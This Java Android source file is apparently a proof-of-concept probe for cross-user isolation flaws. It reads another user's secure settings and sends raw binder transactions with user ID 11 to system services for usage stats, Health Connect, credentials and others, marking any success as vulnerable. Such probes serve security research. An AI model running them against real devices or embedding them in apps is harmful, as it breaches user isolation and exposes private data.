package com.poc.crossuser;

import android.content.ContentProvider;
import android.content.ContentValues;
import android.content.ContentResolver;
import android.database.Cursor;
import android.database.MatrixCursor;
import android.net.Uri;
import android.os.IBinder;
import android.os.Parcel;
import java.lang.reflect.Method;

public class ResultProvider extends ContentProvider {

    @Override
    public boolean onCreate() { return true; }

    @Override
    public Cursor query(Uri uri, String[] proj, String sel, String[] selArgs, String sort) {
        MatrixCursor cursor = new MatrixCursor(new String[]{"test", "result"});

        String path = uri.getPath();
        if (path == null) path = "/all";

        if (path.contains("appfunc") || path.contains("all")) {
            testAppFunction(cursor);
        }
        if (path.contains("settings") || path.contains("all")) {
            testSettingsCrossUser(cursor);
        }
        if (path.contains("usage") || path.contains("all")) {
            testUsageStatsCrossUser(cursor);
        }
        if (path.contains("smartspace") || path.contains("all")) {
            testSmartspace(cursor);
        }
        if (path.contains("health") || path.contains("all")) {
            testHealthConnect(cursor);
        }
        if (path.contains("credential") || path.contains("all")) {
            testCredentialManager(cursor);
        }

        cursor.addRow(new Object[]{"meta_uid", String.valueOf(android.os.Process.myUid())});
        cursor.addRow(new Object[]{"meta_user", String.valueOf(android.os.Process.myUid() / 100000)});
        return cursor;
    }

    private void testAppFunction(MatrixCursor cursor) {
        try {
            IBinder binder = getServiceBinder("app_function");
            if (binder == null) {
                cursor.addRow(new Object[]{"appfunc_binder", "NOT_FOUND"});
                return;
            }
            cursor.addRow(new Object[]{"appfunc_binder", "OK"});
            String desc = "android.app.appfunctions.IAppFunctionManager";
            for (int tx = 1; tx <= 7; tx++) {
                Parcel data = Parcel.obtain();
                Parcel reply = Parcel.obtain();
                data.writeInterfaceToken(desc);
                if (tx == 1 || tx == 2) {
                    data.writeInt(1);
                    data.writeString("*");
                    data.writeInt(100);
                    data.writeStrongBinder(new StubBinder("android.app.appfunctions.ISearchCallback"));
                } else {
                    data.writeInt(0);
                }
                try {
                    binder.transact(tx, data, reply, 0);
                    int ex = reply.readInt();
                    if (ex == 0) {
                        cursor.addRow(new Object[]{"appfunc_tx" + tx, "SUCCESS"});
                    } else {
                        String msg = reply.readString();
                        String s = msg != null ? msg.substring(0, Math.min(100, msg.length())) : "null";
                        cursor.addRow(new Object[]{"appfunc_tx" + tx, "Ex=" + ex + " " + s});
                    }
                } catch (Exception e) {
                    cursor.addRow(new Object[]{"appfunc_tx" + tx, e.getClass().getSimpleName() + ": " + e.getMessage()});
                }
                data.recycle();
                reply.recycle();
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"appfunc_error", e.toString()});
        }
    }

    private void testSettingsCrossUser(MatrixCursor cursor) {
        try {
            Uri uri = Uri.parse("content://11@settings/secure/android_id");
            ContentResolver cr = getContext().getContentResolver();
            Cursor c = cr.query(uri, null, null, null, null);
            if (c != null) {
                if (c.moveToFirst()) {
                    int idx = c.getColumnIndex("value");
                    String val = idx >= 0 ? c.getString(idx) : "no_col";
                    cursor.addRow(new Object[]{"settings_u11_android_id", "VULNERABLE:" + val});
                } else {
                    cursor.addRow(new Object[]{"settings_u11_android_id", "empty_cursor"});
                }
                c.close();
            } else {
                cursor.addRow(new Object[]{"settings_u11_android_id", "null_cursor"});
            }
        } catch (SecurityException e) {
            cursor.addRow(new Object[]{"settings_u11_android_id", "PROTECTED:" + e.getMessage()});
        } catch (Exception e) {
            cursor.addRow(new Object[]{"settings_u11_android_id", e.getClass().getSimpleName() + ":" + e.getMessage()});
        }

        // Also try Global settings (less restricted)
        try {
            Uri uri = Uri.parse("content://11@settings/global/device_name");
            Cursor c = getContext().getContentResolver().query(uri, null, null, null, null);
            if (c != null) {
                if (c.moveToFirst()) {
                    int idx = c.getColumnIndex("value");
                    String val = idx >= 0 ? c.getString(idx) : "no_col";
                    cursor.addRow(new Object[]{"settings_u11_device_name", "VULNERABLE:" + val});
                } else {
                    cursor.addRow(new Object[]{"settings_u11_device_name", "empty_cursor"});
                }
                c.close();
            } else {
                cursor.addRow(new Object[]{"settings_u11_device_name", "null_cursor"});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"settings_u11_device_name", e.getClass().getSimpleName()});
        }
    }

    private void testUsageStatsCrossUser(MatrixCursor cursor) {
        try {
            IBinder binder = getServiceBinder("usagestats");
            if (binder == null) {
                cursor.addRow(new Object[]{"usagestats_binder", "NOT_FOUND"});
                return;
            }
            cursor.addRow(new Object[]{"usagestats_binder", "OK"});
            String desc = "android.app.usage.IUsageStatsManager";
            for (int tx = 5; tx <= 8; tx++) {
                Parcel data = Parcel.obtain();
                Parcel reply = Parcel.obtain();
                data.writeInterfaceToken(desc);
                data.writeInt(11); // userId = Private Space
                data.writeLong(System.currentTimeMillis() - 86400000L);
                data.writeLong(System.currentTimeMillis());
                data.writeString(getContext().getPackageName());
                try {
                    binder.transact(tx, data, reply, 0);
                    int ex = reply.readInt();
                    if (ex == 0) {
                        cursor.addRow(new Object[]{"usagestats_tx" + tx + "_u11", "SUCCESS"});
                    } else {
                        String msg = reply.readString();
                        String s = msg != null ? msg.substring(0, Math.min(100, msg.length())) : "null";
                        cursor.addRow(new Object[]{"usagestats_tx" + tx + "_u11", "Ex=" + ex + " " + s});
                    }
                } catch (Exception e) {
                    cursor.addRow(new Object[]{"usagestats_tx" + tx + "_u11", e.getClass().getSimpleName()});
                }
                data.recycle();
                reply.recycle();
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"usagestats_error", e.toString()});
        }
    }

    private void testSmartspace(MatrixCursor cursor) {
        try {
            IBinder binder = getServiceBinder("smartspace");
            if (binder == null) {
                cursor.addRow(new Object[]{"smartspace_binder", "NOT_FOUND"});
                return;
            }
            cursor.addRow(new Object[]{"smartspace_binder", "OK"});
            String desc = "android.app.smartspace.ISmartspaceManager";
            for (int tx = 1; tx <= 6; tx++) {
                Parcel data = Parcel.obtain();
                Parcel reply = Parcel.obtain();
                data.writeInterfaceToken(desc);
                // Write minimal params (SmartspaceSessionId is first param for most)
                data.writeInt(1); // non-null
                data.writeString("test_session_" + tx); // id string
                data.writeInt(0); // UserHandle (user 0)
                try {
                    binder.transact(tx, data, reply, 0);
                    int ex = reply.readInt();
                    if (ex == 0) {
                        cursor.addRow(new Object[]{"smartspace_tx" + tx, "SUCCESS"});
                    } else {
                        String msg = reply.readString();
                        String s = msg != null ? msg.substring(0, Math.min(100, msg.length())) : "null";
                        cursor.addRow(new Object[]{"smartspace_tx" + tx, "Ex=" + ex + " " + s});
                    }
                } catch (Exception e) {
                    cursor.addRow(new Object[]{"smartspace_tx" + tx, e.getClass().getSimpleName() + ":" + e.getMessage()});
                }
                data.recycle();
                reply.recycle();
            }
            // Now try with user 11 handle
            for (int tx = 1; tx <= 3; tx++) {
                Parcel data = Parcel.obtain();
                Parcel reply = Parcel.obtain();
                data.writeInterfaceToken(desc);
                data.writeInt(1); // non-null
                data.writeString("crossuser_" + tx);
                data.writeInt(11); // UserHandle for user 11!
                try {
                    binder.transact(tx, data, reply, 0);
                    int ex = reply.readInt();
                    if (ex == 0) {
                        cursor.addRow(new Object[]{"smartspace_tx" + tx + "_u11", "SUCCESS"});
                    } else {
                        String msg = reply.readString();
                        String s = msg != null ? msg.substring(0, Math.min(100, msg.length())) : "null";
                        cursor.addRow(new Object[]{"smartspace_tx" + tx + "_u11", "Ex=" + ex + " " + s});
                    }
                } catch (Exception e) {
                    cursor.addRow(new Object[]{"smartspace_tx" + tx + "_u11", e.getClass().getSimpleName() + ":" + e.getMessage()});
                }
                data.recycle();
                reply.recycle();
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"smartspace_error", e.toString()});
        }
    }

    private void testHealthConnect(MatrixCursor cursor) {
        try {
            IBinder binder = getServiceBinder("health_connect");
            if (binder == null) {
                cursor.addRow(new Object[]{"healthconnect_binder", "NOT_FOUND"});
                return;
            }
            cursor.addRow(new Object[]{"healthconnect_binder", "OK"});
            String desc = "android.health.connect.aidl.IHealthConnectService";
            // Try a few TX codes - getGrantedPermissions(pkg, user) would be interesting
            for (int tx = 1; tx <= 5; tx++) {
                Parcel data = Parcel.obtain();
                Parcel reply = Parcel.obtain();
                data.writeInterfaceToken(desc);
                data.writeString(getContext().getPackageName());
                data.writeInt(11); // user 11
                try {
                    binder.transact(tx, data, reply, 0);
                    int ex = reply.readInt();
                    if (ex == 0) {
                        cursor.addRow(new Object[]{"healthconnect_tx" + tx + "_u11", "SUCCESS"});
                    } else {
                        String msg = reply.readString();
                        String s = msg != null ? msg.substring(0, Math.min(100, msg.length())) : "null";
                        cursor.addRow(new Object[]{"healthconnect_tx" + tx + "_u11", "Ex=" + ex + " " + s});
                    }
                } catch (Exception e) {
                    cursor.addRow(new Object[]{"healthconnect_tx" + tx + "_u11", e.getClass().getSimpleName() + ":" + e.getMessage()});
                }
                data.recycle();
                reply.recycle();
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"healthconnect_error", e.toString()});
        }
    }

    private void testCredentialManager(MatrixCursor cursor) {
        try {
            IBinder binder = getServiceBinder("credential");
            if (binder == null) {
                cursor.addRow(new Object[]{"credential_binder", "NOT_FOUND"});
                return;
            }
            cursor.addRow(new Object[]{"credential_binder", "OK"});
            String desc = "android.credentials.ICredentialManager";
            // TX codes for CredentialManager
            for (int tx = 1; tx <= 10; tx++) {
                Parcel data = Parcel.obtain();
                Parcel reply = Parcel.obtain();
                data.writeInterfaceToken(desc);
                data.writeString(getContext().getPackageName());
                try {
                    binder.transact(tx, data, reply, 0);
                    int ex = reply.readInt();
                    if (ex == 0) {
                        cursor.addRow(new Object[]{"credential_tx" + tx, "SUCCESS"});
                    } else {
                        String msg = reply.readString();
                        String s = msg != null ? msg.substring(0, Math.min(100, msg.length())) : "null";
                        cursor.addRow(new Object[]{"credential_tx" + tx, "Ex=" + ex + " " + s});
                    }
                } catch (Exception e) {
                    cursor.addRow(new Object[]{"credential_tx" + tx, e.getClass().getSimpleName() + ":" + e.getMessage()});
                }
                data.recycle();
                reply.recycle();
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"credential_error", e.toString()});
        }
    }

    private IBinder getServiceBinder(String name) {
        try {
            Class<?> sm = Class.forName("android.os.ServiceManager");
            Method m = sm.getMethod("getService", String.class);
            return (IBinder) m.invoke(null, name);
        } catch (Exception e) {
            return null;
        }
    }

    @Override public String getType(Uri uri) { return null; }
    @Override public Uri insert(Uri uri, ContentValues values) { return null; }
    @Override public int delete(Uri uri, String sel, String[] selArgs) { return 0; }
    @Override public int update(Uri uri, ContentValues values, String sel, String[] selArgs) { return 0; }

    private static class StubBinder extends android.os.Binder {
        private final String descriptor;
        StubBinder(String desc) {
            this.descriptor = desc;
            attachInterface(null, desc);
        }
        @Override public String getInterfaceDescriptor() { return descriptor; }
        @Override protected boolean onTransact(int code, Parcel data, Parcel reply, int flags) {
            if (reply != null) reply.writeNoException();
            return true;
        }
    }
}
